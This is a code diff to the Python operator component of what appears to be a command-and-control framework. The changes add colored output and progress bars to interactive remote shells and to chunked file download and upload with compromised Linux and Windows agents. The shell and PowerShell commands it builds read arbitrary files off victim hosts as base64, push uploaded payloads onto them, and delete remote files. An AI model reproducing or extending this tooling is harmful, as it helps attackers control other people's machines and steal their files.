@@ -2,6 +2,77 @@ import base64, socket
 from core import session_manager
 import queue
 import subprocess, os, sys
+from tqdm import tqdm
+
+from colorama import init, Fore, Style
+brightgreen = Style.BRIGHT + Fore.GREEN
+brightyellow = Style.BRIGHT + Fore.YELLOW
+brightred = Style.BRIGHT + Fore.RED
+brightblue = Style.BRIGHT + Fore.BLUE
+
+def print_raw_progress(current, total, bar_width=40):
+    percent = current / total
+    done = int(bar_width * percent)
+    bar = "[" + "#" * done + "-" * (bar_width - done) + f"] {int(percent * 100)}%"
+    sys.stdout.write("\r" + bar)
+    sys.stdout.flush()
+
+def run_command_http(sid, cmd):
+    session = session_manager.sessions[sid]
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+    meta = session.metadata
+
+    b64_cmd = base64.b64encode(cmd.encode()).decode()
+
+    try:
+        session.command_queue.put(b64_cmd)
+
+    except Exception as e:
+        print(brightred + f"[-] ERROR failed to send command through the queue: {e}")
+
+    try:
+        out_b64 = session.output_queue.get()
+
+    except Exception as e:
+        print(brightred + f"[-] ERROR failed to get command output from queue: {e}")
+
+    try:
+        return base64.b64decode(out_b64).decode("utf-8", "ignore").strip()
+
+    except Exception as e:
+        print(brightred + f"[-] ERROR failed to decode command output: {e}")
+
+def run_command_tcp(sid, cmd):
+    session = session_manager.sessions[sid]
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+    client_socket = session.handler
+
+    try:
+        try:
+            client_socket.sendall(cmd.encode() + b"\n")
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to send command over socket: {e}")
+            
+        client_socket.settimeout(10.0)
+        response = b''
+
+        while True:
+            try:
+                chunk = client_socket.recv(4096)
+
+                if not chunk:
+                    break
+
+                response += chunk
+
+            except socket.timeout:
+                break
+
+        return response.decode(errors='ignore').strip()
+
+    except Exception as e:
+        return f"[!] Error: {e}"
 
 
 def interactive_http_shell(sid):
@@ -9,7 +80,7 @@ def interactive_http_shell(sid):
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     meta = session.metadata
 
-    print(f"[*] Interactive HTTP shell with {display}. Type 'exit' to return.")
+    print(brightgreen + f"[*] Interactive HTTP shell with {display}. Type 'exit' to return.")
 
     while True:
         cmd = input(f"{display}> ").strip()
@@ -38,7 +109,7 @@ def interactive_http_shell(sid):
 def interactive_tcp_shell(sid):
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     client_socket = session_manager.sessions[sid].handler
-    print(f"[*] Interactive TCP shell with {display}. Type 'exit' to close.")
+    print(brightgreen + f"[*] Interactive TCP shell with {display}. Type 'exit' to close.")
 
     try:
         while True:
@@ -46,7 +117,7 @@ def interactive_tcp_shell(sid):
             if cmd.strip().lower() in ("exit", "quit"):
                 client_socket.close()
                 del session_manager.sessions[sid]
-                print(f"[*] Closed TCP session {display}")
+                print(brightyellow + f"[*] Closed TCP session {display}")
                 break
 
             if not cmd.strip():
@@ -56,7 +127,7 @@ def interactive_tcp_shell(sid):
                 client_socket.sendall(cmd.encode() + b"\n")
 
             except BrokenPipeError:
-                print("[!] Connection closed by remote host.")
+                print(brightred + "[!] Connection closed by remote host.")
                 break
 
             client_socket.settimeout(10.0)
@@ -74,7 +145,7 @@ def interactive_tcp_shell(sid):
             print(response.decode(errors='ignore').strip())
 
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(brightred + f"[!] Error: {e}")
         client_socket.close()
         del session_manager.sessions[sid]
 
@@ -113,9 +184,218 @@ def download_file_http(sid, remote_file, local_file):
 
     if meta.get("os", "").lower() == "linux":
         host = meta.get("hostname", "").lower()
-        command = f"cat {remote_file} | base64 -w0"
+        CHUNK_SIZE = 30000  # Number of bytes per chunk (before base64 encoding)
+        MAX_CHUNKS = 10000  # Safeguard to prevent infinite loop
+
+        # Get file size first
+        size_cmd = f"stat -c %s {remote_file}"
+        session.command_queue.put(base64.b64encode(size_cmd.encode()).decode())
+        file_size_raw = session.output_queue.get()
+
+        print(brightyellow + f"[*] Downloading file from {host} in chunks...")
+
+        try:
+            file_size = int(base64.b64decode(file_size_raw).decode().strip())
+        except:
+            print(brightred + f"[-] Failed to get file size for {remote_file}")
+            return
+
+        total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
+        collected_b64 = ""
+
+        with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
+            for i in range(total_chunks):
+                offset = i * CHUNK_SIZE
+                chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
+                b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
+
+                session.command_queue.put(b64_chunk_cmd)
+                chunk_output = session.output_queue.get()
+
+                try:
+                    chunk_decoded = base64.b64decode(chunk_output).decode()
+                    collected_b64 += chunk_decoded
+                    pbar.update(1)
+                except Exception as e:
+                    print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
+                    break
+
+        try:
+            decoded_file = base64.b64decode(collected_b64.encode())
+
+            with open(local_file, "wb") as f:
+                f.write(decoded_file)
+
+            print(brightgreen + f"[+] Download complete. Saved to {local_file}")
+
+        except Exception as e:
+            print(brightred + f"[!] Error decoding final file: {e}")
+
+    elif meta.get("os", "") .lower() == "windows":
+        CHUNK_SIZE = 30000  # Adjust safely for command length + base64
+        MAX_CHUNKS = 10000
+
+        print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")
+
+        # Step 1: Get file size
+        size_cmd = (
+        f"$s=(Get-Item '{remote_file}').Length;"
+        f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
+        )
+
+        b64_size_cmd = base64.b64encode(size_cmd.encode()).decode()
+        session.command_queue.put(b64_size_cmd)
+        size_b64 = session.output_queue.get()
+
+        try:
+            size_str = bytes([int(x) for x in base64.b64decode(size_b64).decode().split(",")]).decode()
+            file_size = int(size_str.strip())
+
+        except Exception as e:
+            print(brightred + f"[-] Failed to parse file size: {e}")
+            return
+
+        total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
+        collected_b64 = ""
+
+        with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
+            for i in range(total_chunks):
+                offset = i * CHUNK_SIZE
+
+                # Step 2: Read chunk using PowerShell and base64 encode it
+                chunk_cmd = (
+                    f"$fs = [System.IO.File]::OpenRead('{remote_file}');"
+                    f"$fs.Seek({offset},'Begin') > $null;"
+                    f"$buf = New-Object byte[] {CHUNK_SIZE};"
+                    f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
+                    f"$fs.Close();"
+                    f"[Convert]::ToBase64String($buf, 0, $read)"
+                )
+
+                b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
+                session.command_queue.put(b64_chunk_cmd)
+                chunk_output = session.output_queue.get()
+
+                try:
+                    chunk_decoded = base64.b64decode(chunk_output).decode()
+                    collected_b64 += chunk_decoded
+                    pbar.update(1)
+
+                except Exception as e:
+                    print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
+                    break
+
+        # Step 3: Final decode & write
+        try:
+            collect_decoded = base64.b64decode(collected_b64)
+            decode_bytes = collect_decoded.decode(errors='ignore').strip()
+            
+            with open(local_file, "w") as f:
+                f.write(decode_bytes)
+
+            subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
+            os.replace(local_file + '.tmp', local_file)
+
+            print(brightgreen + f"[+] Download complete. Saved to {local_file}")
+
+        except Exception as e:
+            print(brightred + f"[!] Error decoding final file: {e}")
+
+
+def download_file_tcp(sid, remote_file, local_file):
+    client_socket = session_manager.sessions[sid].handler
+    session = session_manager.sessions[sid]
+    meta = session.metadata
+
+    if meta.get("os", "").lower() == "linux":
+        CHUNK_SIZE = 30000
+        MAX_CHUNKS = 10000
+        host = meta.get("hostname", "").lower()
+
+        print(brightyellow + f"[*] Downloading file from {host} in chunks over TCP...")
+
+        # Step 1: Get file size
+        size_cmd = f"stat -c %s {remote_file}"
+        client_socket.sendall((size_cmd + "\n").encode())
+
+        file_size_raw = b""
+        client_socket.settimeout(2)
+        while True:
+            try:
+                chunk = client_socket.recv(4096)
+
+                if not chunk:
+                    break
+
+                file_size_raw += chunk
+
+            except socket.timeout:
+                break
+
+        try:
+            file_size = file_size_raw.decode()
+            stripped_file_size = file_size.strip()
+            clean_file_size = stripped_file_size.splitlines()[0].strip()
+            number_file_size = int(clean_file_size)
+            #print(decoded_file_size)
+            #file_size = int(file_size_raw.decode().strip())
+
+        except Exception as e:
+            print(brightred + f"[-] Failed to get file size: {e}")
+            return
+
+        try:
+            total_chunks = (number_file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to calculate total chunks: {e}")
+
+        collected_b64 = ""
+
+        with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
+            for i in range(total_chunks):
+                offset = i * CHUNK_SIZE
+                chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
+                client_socket.sendall((chunk_cmd + "\n").encode())
+
+                chunk_data = b""
+                while True:
+                    try:
+                        part = client_socket.recv(4096)
+
+                        if not part:
+                            break
+
+                        chunk_data += part
+
+                    except socket.timeout:
+                        break
+
+                try:
+                    decoded = chunk_data.decode(errors='ignore').strip()
+                    #decoded = base64.b64decode(chunk_data.decode().strip())
+                    collected_b64 += decoded
+                    pbar.update(1)
+
+                except Exception as e:
+                    print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
+                    break
+
+        try:
+            final_bytes = base64.b64decode(collected_b64.encode())
+
+            with open(local_file, "wb") as f:
+                f.write(final_bytes)
+
+            print(brightgreen + f"[+] Download complete. Saved to {local_file}")
+
+        except Exception as e:
+            print(brightred + f"[!] Error saving file: {e}")
+
+
+        """command = f"cat {remote_file} | base64 -w0"
         b64_command = base64.b64encode(command.encode()).decode()
-        session.command_queue.put(b64_cmd)
+        session.command_queue.put(b64_command)
 
         print(f"[*] Downloading file from {host}...")
 
@@ -124,7 +404,7 @@ def download_file_http(sid, remote_file, local_file):
         try:
             decode1 = base64.b64decode(b64_output)
             decode2 = base64.b64decode(decode1)
-            agent_output = decode2.decode(errors='ignore').strip
+            agent_output = decode2.decode(errors='ignore').strip()
 
             with open(local_file, "w") as f:
                 f.write(agent_output)
@@ -132,113 +412,86 @@ def download_file_http(sid, remote_file, local_file):
             print(f"[+] Download complete. Saved to {local_file}")
 
         except Exception as e:
-            print(f"[!] Error decoding file: {e}")
+            print(f"[!] Error decoding file: {e}")"""
 
-    elif meta.get("os", "") .lower() == "windows":
-        # Build fully encoded PowerShell command (same as TCP)
-        encoded_ps = build_powershell_encoded_download(remote_file)
-        b64_cmd = base64.b64encode(encoded_ps.encode()).decode()
-        session.command_queue.put(b64_cmd)
-
-        print(f"[*] Waiting for file from HTTP agent {sid}...")
-
-        b64_output = session.output_queue.get()
-
+    elif meta.get("os", "").lower() == "windows":
+        CHUNK_SIZE = 30000
 
         try:
-            # Decode the agent output like TCP
-            """agent_output_utf16 = base64.b64decode(b64_output)
-            print(b64_output)
-            print(agent_output_utf16)
-            final_base64 = base64.b64decode(agent_output_utf16)
-            print(final_base64)"""
+            # Get file size
+            size_cmd = (
+                f"$s=(Get-Item '{remote_file}').Length;"
+                f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
+            )
+            client_socket.sendall((size_cmd + "\n").encode())
+            raw_size = client_socket.recv(4096).decode()
+            size_str = bytes([int(x) for x in raw_size.strip().split(",")]).decode()
+            file_size = int(size_str.strip())
 
-            #agent_output = b64_output.decode(errors='ignore').strip()
+        except Exception as e:
+            print(brightred + f"[-] Failed to get file size: {e}")
+            return
 
-            # Now decode the file data from base64 into raw bytes
-        
-            file_bytes = base64.b64decode(b64_output)
-        
-            finalde = base64.b64decode(file_bytes)
-        
-            agent_output = finalde.decode(errors='ignore').strip()
-        
+        total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
+        collected_b64 = ""
 
-            with open(local_file, "w") as f:
-                f.write(agent_output)
+        print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")
 
-            # Apply iconv re-encoding for UTF-8 output
+        with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
+            for i in range(total_chunks):
+                offset = i * CHUNK_SIZE
+                chunk_cmd = (
+                    f"$fs = [System.IO.File]::OpenRead('{remote_file}');"
+                    f"$fs.Seek({offset},'Begin') > $null;"
+                    f"$buf = New-Object byte[] {CHUNK_SIZE};"
+                    f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
+                    f"$fs.Close();"
+                    f"[Convert]::ToBase64String($buf, 0, $read)"
+                )
+
+                client_socket.sendall((chunk_cmd + "\n").encode())
+
+                client_socket.settimeout(3)
+                chunk_data = b""
+                try:
+                    while True:
+                        part = client_socket.recv(4096)
+                        if not part:
+                            break
+
+                        chunk_data += part
+
+                        if b"==" in part or b"=" in part[-3:]:
+                            break
+
+                except socket.timeout:
+                    pass
+
+                try:
+                    #base64_decoded_chunk = base64.b64decode(chunk_data)
+                    chunk_decoded = chunk_data.decode(errors='ignore').strip()
+                    #chunk_decoded = base64.b64decode(chunk_data).decode()
+                    collected_b64 += chunk_decoded
+                    pbar.update(1)
+
+                except Exception as e:
+                    print(brightred + f"[-] Failed decoding chunk {i+1}: {e}")
+                    break
+
+        try:
+            final_data = base64.b64decode(collected_b64.encode())
+
+            with open(local_file, "wb") as f:
+                f.write(final_data)
+
             subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
             os.replace(local_file + '.tmp', local_file)
 
-            print(f"[+] Download complete. Saved to {local_file}")
+            print(brightgreen + f"[+] Download complete. Saved to {local_file}")
 
         except Exception as e:
-            print(f"[!] Error decoding file: {e}")
-
-
-
-
-def download_file_tcp(sid, remote_file, local_file):
-    client_socket = session_manager.sessions[sid].handler
-
-    try:
-        #safe_path = sanitize_path(remote_file)
-        """powershell_download = (
-    f"powershell -NoProfile -ExecutionPolicy Bypass -Command "
-    f"\"[Console]::OutputEncoding = [System.Text.Encoding]::ASCII; "
-    f"$bytes = [IO.File]::ReadAllBytes('{remote_file}'); "
-    "[Convert]::ToBase64String($bytes)\""
-)"""
-
-        #print(powershell_download)
-
-        encoded_ps = build_powershell_encoded_download(remote_file)
-        command = encoded_ps + "\n"
-        client_socket.sendall(command.encode())
-
-        client_socket.settimeout(2)
-        raw_data = b""
-
-        while True:
-            try:
-                chunk = client_socket.recv(4096)
-                #print(chunk)
-                if not chunk:
-                    break
-                raw_data += chunk
-            except socket.timeout:
-                break
-
-        #print(raw_data)
-
-        #agent_output = raw_data.decode("utf-16le", errors="ignore").strip()
-
-        agent_output = raw_data.decode(errors="ignore").strip()
-        #print(agent_output)
-
-        # Step 1: decode agent b64 output
-        #utf16_bytes = base64.b64decode(agent_output)
-        #agent_b64_data = utf16_bytes.decode("utf-16le").strip()
-        
-
-        # Step 2: decode actual file content
-        file_bytes = base64.b64decode(agent_output)
-        """print(file_bytes)
-        print(agent_output)"""
-        
-
-        with open(local_file, "wb") as f:
-            f.write(file_bytes)
-
-        subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
-        os.replace(local_file + '.tmp', local_file)
-
-        print(f"[+] Download complete. Saved to {local_file}")
-
-    except Exception as e:
-        print(f"[!] Download failed: {e}")
-
+            print(brightred + f"[!] Error writing final file: {e}")
+            
 
 ### 🔥 Upload Logic (NEW!) ###
 
@@ -266,71 +519,204 @@ def build_chunk_upload_command(remote_file, b64chunk):
 # Upload for HTTP agents
 def upload_file_http(sid, local_file, remote_file):
     session = session_manager.sessions[sid]
+    meta = session.metadata
+    host = meta.get("hostname", "").lower()
+    os_type = meta.get("os", "").lower()
 
-    # Read file and prepare chunks
-    with open(local_file, "rb") as f:
-        file_data = f.read()
+    if os_type == "linux":
+        CHUNK_SIZE = 45000
 
-    b64_data = base64.b64encode(file_data).decode()
+        # Clear the remote file first
+        clear_cmd = f"rm -f {remote_file}"
+        b64_clear = base64.b64encode(clear_cmd.encode()).decode()
+        session.command_queue.put(b64_clear)
+        session.output_queue.get()
 
-    # Clear existing remote file
-    clear_cmd = f"&{{ Try {{ Remove-Item -Path '{remote_file}' -ErrorAction Stop }} Catch {{ }} }}"
-    b64_clear = base64.b64encode(clear_cmd.encode()).decode()
-    session.command_queue.put(b64_clear)
-    #session.output_queue.get()  # consume output
+        try:
+            with open(local_file, "r") as f:
+                file_data = f.read()
 
-    print(f"[*] Uploading file to HTTP agent {sid}...")
+        except Exception as e:
+            print(brightred + f"[-] ERROR opening local file: {e}")
 
-    # Send chunks
-    for i in range(0, len(b64_data), CHUNK_SIZE):
-        #print("TEST")
-        chunk = b64_data[i:i+CHUNK_SIZE]
-        chunk_cmd = build_chunk_upload_command(remote_file, chunk)
-        b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
-        session.command_queue.put(b64_chunk_cmd)
-        #session.output_queue.get()
-        #print(f"  [+] Uploaded chunk {i//CHUNK_SIZE + 1}")
+        #print("DEBUG")
 
-    print(f"[+] Upload complete for {remote_file}")
+        try:
+            if file_data and file_data is not None:
+                b64_filedata = base64.b64encode(file_data.encode()).decode()
+
+            else:
+                print(brightred + f"[-] ERROR failed to encode local file.")
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to encode local file because of error: {e}")
+
+        #print("DEBUG1")
+
+        total_chunks = (len(b64_filedata) + CHUNK_SIZE - 1) // CHUNK_SIZE
+
+        #print("SET TOTAL CHUNKS")
+
+
+        try:
+            with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
+                for i in range(0, len(b64_filedata), CHUNK_SIZE):
+                    #print("ENTERED FOR LOOP")
+                    chunk = b64_filedata[i:i + CHUNK_SIZE]
+                    cmd = f"printf '%s' '{chunk}' | base64 -d >> {remote_file}"
+                    b64_cmd = base64.b64encode(cmd.encode()).decode()
+                    session.command_queue.put(b64_cmd)
+                    session.output_queue.get()
+                    pbar.update(1)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to upload file chunks to {host}")
+            print(brightred + f"[-] ERROR DEBUG INFO: {e}")
+
+        print(brightyellow + f"[*] Uploading file to HTTP agent {host}...")
+            
+        
+    elif os_type == "windows":
+        CHUNK_SIZE = 5000
+        # Read file and prepare chunks
+
+        try:
+            with open(local_file, "rb") as f:
+                file_data = f.read()
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR ocurred: {e}")
+
+
+        b64_data = base64.b64encode(file_data).decode()
+
+        total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE
+
+        # Clear existing remote file
+        clear_cmd = f"&{{ Try {{ Remove-Item -Path '{remote_file}' -ErrorAction Stop }} Catch {{ }} }}"
+        b64_clear = base64.b64encode(clear_cmd.encode()).decode()
+        session.command_queue.put(b64_clear)
+
+
+        print(brightyellow + f"[*] Uploading file to HTTP agent {sid}...")
+
+        # Send chunks
+        try:
+            with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
+                for i in range(0, len(b64_data), CHUNK_SIZE):
+                    chunk = b64_data[i:i + CHUNK_SIZE]
+                    chunk_cmd = build_chunk_upload_command(remote_file, chunk)
+                    b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
+                    session.command_queue.put(b64_chunk_cmd)
+                    session.output_queue.get()
+                    pbar.update(1)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to upload file chunks to {host}")
+            print(brightred + f"[-] ERROR DEBUG INFO: {e}")
+
+        print(brightgreen + f"[+] Upload complete for {remote_file}")
 
 # Upload for TCP agents
 def upload_file_tcp(sid, local_file, remote_file):
     client_socket = session_manager.sessions[sid].handler
-    #print("MADEIT")
+    session = session_manager.sessions[sid]
+    meta = session.metadata
+    host = meta.get("hostname", "").lower()
+    os_type = meta.get("os", "").lower()
+    CHUNK_SIZE = 45000
 
-    with open(local_file, "rb") as f:
-        file_data = f.read()
+    print(brightyellow + f"[*] Uploading file to TCP agent {host}...")
 
-    b64_data = base64.b64encode(file_data).decode()
-    """print(b64_data)"""
-    #print("READ LOCAL FILE")
+    try:
+        with open(local_file, "rb") as f:
+            file_data = f.read()
+    except Exception as e:
+        print(brightred + f"[-] ERROR opening local file: {e}")
+        return
 
-    # Clear existing remote file
-    clear_cmd = f"&{{ Try {{ Remove-Item -Path '{remote_file}' -ErrorAction Stop }} Catch {{ }} }}\n"
-    #print(clear_cmd)
-    #print("CREATED REMOVE COMMAND")
-    client_socket.sendall(clear_cmd.encode())
-    #print("TEST")
-    """c = client_socket.recv(4096)
-    if c is None:
-        print("IT IS NONE")
-    print(c)"""
-    #print("STEP1")
+    try:
+        if file_data:
+            b64_data = base64.b64encode(file_data).decode()
+        else:
+            print(brightred + f"[-] ERROR: local file was empty or unreadable.")
+            return
+    except Exception as e:
+        print(brightred + f"[-] ERROR encoding local file: {e}")
+        return
 
-    print(f"[*] Uploading file to TCP agent {sid}...")
+    if os_type == "windows":
+        clear_cmd = f"&{{ Try {{ Remove-Item -Path '{remote_file}' -ErrorAction Stop }} Catch {{ }} }}\n"
 
-    for i in range(0, len(b64_data), CHUNK_SIZE):
-        chunk = b64_data[i:i+CHUNK_SIZE]
-        #print(chunk)
-        chunk_cmd = build_chunk_upload_command(remote_file, chunk) + "\n"
-        #print(chunk_cmd)
-        client_socket.sendall(chunk_cmd.encode())
-        #client_socket.recv(4096)
-        #print(f"  [+] Uploaded chunk {i//CHUNK_SIZE + 1}")
-        
+    elif os_type == "linux":
+        clear_cmd = f"rm -f '{remote_file}'\n"
 
-    print(f"[+] Upload complete for {remote_file}")
-    #print(len(b64_data))
+    else:
+        print(brightred + f"[-] Unsupported OS type: {os_type}")
+        return
+
+    try:
+        client_socket.sendall(clear_cmd.encode())
+
+    except Exception as e:
+        print(brightred + f"[-] ERROR sending command: {e}")
+        return
+
+    total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE
+
+    if os_type == "linux":
+        try:
+            with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
+                for i in range(total_chunks):
+                    chunk = b64_data[i * CHUNK_SIZE : (i + 1) * CHUNK_SIZE]
+                    chunk_cmd = f"printf '%s' '{chunk}' | base64 -d >> '{remote_file}'\n"
+
+                    try:
+                        client_socket.sendall(chunk_cmd.encode())
+                        try:
+                            pbar.update(1)
+
+                        except Exception as e:
+                            print(brightred + f"[-] ERROR printing progress bar: {e}")
+
+                    except Exception as e:
+                        print(brightred + f"[-] ERROR ocurred when sending command: {e}")
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
+            return
+
+        print(brightgreen + f"[+] Upload complete for {remote_file}")
+
+    elif os_type == "windows":
+        CHUNK_SIZE = 5000
+        total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE
+        try:
+            with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
+                for i in range(total_chunks):
+                    chunk = b64_data[i * CHUNK_SIZE : (i + 1) * CHUNK_SIZE]
+                    chunk_cmd = build_chunk_upload_command(remote_file, chunk) + "\n"
+
+                    try:
+                        client_socket.sendall(chunk_cmd.encode())
+                        try:
+                            pbar.update(1)
+
+                        except Exception as e:
+                            print(brightred + f"[-] ERROR printing progress bar: {e}")
+
+                    except Exception as e:
+                        print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
+                        return
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
+            return
+
+        print(brightgreen + f"[+] Upload complete for {remote_file}")
+
+    else:
+        print(brightred + f"[-] Unsupported OS detected!")
 
 
 output_queue = queue.Queue()
